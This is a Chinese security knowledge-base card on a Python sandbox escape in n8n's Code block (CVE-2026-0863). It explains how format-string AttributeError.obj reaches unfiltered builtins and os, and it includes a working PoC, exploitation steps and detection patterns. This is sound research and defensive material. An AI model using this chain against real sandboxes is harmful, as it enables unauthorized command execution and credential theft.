---
id: binary-pwn-sandbox-escape-python-format-string-attributeerror-getattr
title: Python 格式字符串 AttributeError.obj 构造 getattr：绕过属性名黑名单，经 traceback→frame→f_builtins 取 __import__ 逃逸
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-format-string-attributeerror-getattr
tags:
- python
- pyjail
- sandbox-escape
- format-string
- attributeerror
- traceback
- builtins
- rce
cve:
- CVE-2026-0863
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T11:43:29+08:00'
  notes: 已对照原文与 7 张图核对：PoC 在 n8n 1.116.0 Python (Native) Code 块返回 uname（Linux/e1875f689d22/6.8.0-64-generic/aarch64），调试截图逐步验证 traceback→tb_frame→f_builtins→__import__；原文只给复现环境 1.116.0、未给受影响版本区间，故不 set-versions。PoC 未独立复跑；CVE 归属沿用同源 JFrog 报告（与 91325 卡一致）。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-python-format-string-attributeerror-getattr/
draft: false
kb_aliases:
- 格式字符串 getattr
- AttributeError.obj getattr
- f-string 属性访问逃逸
- 0.attribute.ribbit
- n8n Python 沙箱逃逸 PoC
- f_builtins 取 builtins
---

## 一句话结论

当 Python 沙箱禁用 `getattr` 且用 AST/字符串黑名单拦截 `__traceback__`、`f_builtins`、`__import__` 等属性名时，可以用 `"{0." + attr + ".ribbit"}".format(obj)` 触发 `AttributeError`，从异常对象的 `.obj` 取回“最后一个成功解析的属性” `obj.attr`，从而在源码中不出现危险属性名地实现任意 `getattr`；再沿 `__traceback__ → tb_frame → f_builtins → __import__ → __globals__["os"]` 取到未过滤的 builtins 与 os，执行任意命令（n8n Python runner 实测，对应 CVE-2026-0863 的利用链之一）。

## 原理

- **format 的字段访问就是 getattr**：`"{0.attr.ribbit}".format(obj)` 会让 `str.format` 依次解析 `obj.attr`、再访问 `.ribbit`。最后一步不存在时抛出 `AttributeError`；CPython 的 `AttributeError` 在 3.10+ 带 `.obj`，指向**最后一次成功解析的对象**，即 `obj.attr`。
- **源码里不出现属性名**：`attr` 是运行时拼接的字符串（甚至可用 `chr(95)` 拼 `__`），AST 只能看到 `"{0." + attribute + ".ribbit"}` 这个字符串表达式，看不到 `__traceback__`、`f_builtins` 等标识符，因此绕过基于 AST 属性访问的黑名单。
- **不需要 getattr**：整个过程只调用 `str.format` 和异常捕获，不使用被禁用的 `getattr`；只要沙箱允许 `try/except` 与字符串格式化即可。
- **拿到真实 builtins**：从 `raise ValueError("pwn")` 捕获的异常 `e` 出发，用上述原语依次取 `e.__traceback__` → `tb.__tb_frame` → `frame.f_builtins`；`f_builtins` 是解释器当前帧的原始 builtins 字典，未经 n8n `_filter_builtins()` 过滤。
- **拿到 os**：用 `chr(95)` 拼出 `__import__` 键取出真实导入函数；`__import__.__globals__` 是 `builtins` 模块的全局字典，其中已导入 `os`，直接 `["os"]` 取到模块，无需再调用 import。
- **危害**：拿到 `os` 即可 `system`/`popen`/文件读写；n8n internal 模式落在主节点，external 模式落在 sidecar 容器。修复需同时封堵 `obj` 属性与 format 字段遍历，单纯补一个属性名不够。

## 触发条件

- 目标允许执行用户 Python 代码（如 n8n Code 块 Python (Native)、其他 PyJail 场景）。
- 沙箱允许 `try/except` 与 `str.format`/f-string，且没有禁用 `AttributeError.obj`。
- 属性名黑名单只做 AST/源码检查，运行时可拼接字符串访问属性。
- 执行 globals 的 `__builtins__` 被过滤，但当前帧的 `f_builtins` 仍保存原始 builtins。
- 目标 Python 版本为 3.10+（`AttributeError.obj` 可用；3.11/3.12 同样）。

## 利用步骤

1. 定义 `new_getattr(obj, attribute)`：构造 `"{0." + attribute + ".ribbit"}` 并 `format(obj)`，捕获 `AttributeError` 后返回 `e.obj`。
2. 主动 `raise ValueError("pwn")` 并捕获，得到异常对象 `e`。
3. `tb = new_getattr(e, "__traceback__")` 取回溯；`frame = new_getattr(tb, "tb_frame")` 取栈帧。
4. `builtins_dict = new_getattr(frame, "f_builtins")` 取未过滤 builtins。
5. 用 `chr(95)` 拼 `__import__` 键取出导入函数；`import_globals = new_getattr(imprt, "__globals__")`，`os = import_globals["os"]`。
6. 执行无害命令（如 `os.uname()`）确认逃逸，再评估可读取的配置/凭据。

## PoC

```python
def new_getattr(obj, attribute):
    fmt = "{" + "0." + attribute + ".ribbit" + "}"
    try:
        fmt.format(obj)
    except AttributeError as e:
        return e.obj          # 最后一次成功解析的对象：obj.attribute

try:
    raise ValueError("pwn")
except Exception as e:
    tb = new_getattr(e, "__traceback__")
    frame = new_getattr(tb, "tb_frame")
    builtins_dict = new_getattr(frame, "f_builtins")

    us = chr(95)
    imprt = builtins_dict[us + us + "import" + us + us]
    import_globals = new_getattr(imprt, "__globals__")
    os = import_globals["os"]

    return [{"json": {
        "vulnerable": True,
        "system": os.uname().sysname,
        "node": os.uname().nodename,
        "release": os.uname().release,
        "machine": os.uname().machine,
    }}]
```

说明：原文在 n8n 1.116.0 + `N8N_NATIVE_PYTHON_RUNNER=true` 的 Code 块中实测返回 `uname` 结果；本机未复跑。

## 变体与关联

- **属性名变体**：`__traceback__`、`tb_frame`、`f_builtins`、`__globals__` 全部可用字符串拼接/`chr()` 规避黑名单；`tb_next`/`f_back` 可按调用深度换层。
- **路径变体**：`f_globals['__builtins__']`、生成器 `gi_frame`、协程 `cr_frame`、`sys._getframe` 等；见关联卡片。
- **格式化变体**：`"{0.__class__.__mro__}"` 等直接字段访问在未过滤时可用；`format_map`、`%` 格式化、`string.Formatter` 也可能泄露中间对象。
- **沙箱变体**：任何允许用户 Python 且只做源码/AST 黑名单的沙箱（n8n、自定义 PyJail、插件执行器）；若使用 RestrictedPython/独立进程/容器，风险显著降低。
- **关联**：[[binary-pwn-sandbox-escape-python-traceback-frame-escape]]（直接 `__traceback__.tb_frame` 路径）、[[binary-pwn-sandbox-escape-python-generator-frame-builtins-recovery]]（生成器帧恢复 builtins）、[[web-nodejs-n8n-python-task-runner-eobj-sandbox-escape-rce]]（同 CVE 的 n8n `e.obj` + 字符串格式化 `__import__` 变体）、[[binary-pwn-sandbox-escape-crawl4ai-hooks-import-whitelist-rce]]（builtins 白名单保留 `__import__`）。

## 检测与防御

- **封堵 obj 与字段遍历**：AST/运行时同时禁止 `AttributeError.obj` 与 `str.format`/f-string 的字段访问（`0.attr` 形式），或直接改用 AST 白名单，不允许 `Try`/`Attribute`/`Subscript`。
- **不要用黑名单当沙箱**：不可信 Python 代码必须放入独立进程/容器，低权限、只读文件系统、无网络、seccomp；Python 层 exec 过滤只能作为纵深防御。
- **清理执行环境**：执行 globals 中彻底移除 `__builtins__`，并切断异常回溯/帧对象（如使用 RestrictedPython、子解释器或独立进程），仅过滤属性名不足以阻止。
- **检测**：用户代码中出现 `"{0.`、`.ribbit`、`chr(95)`、`__traceback__`、`tb_frame`、`f_builtins`、`__globals__`、`os.uname` 等组合；异常处理后紧跟危险调用。
- **响应**：发现逃逸立即停用代码执行功能/隔离运行器，轮换运行器可读的凭据与密钥，审计近期 Code 块执行记录与落地文件。
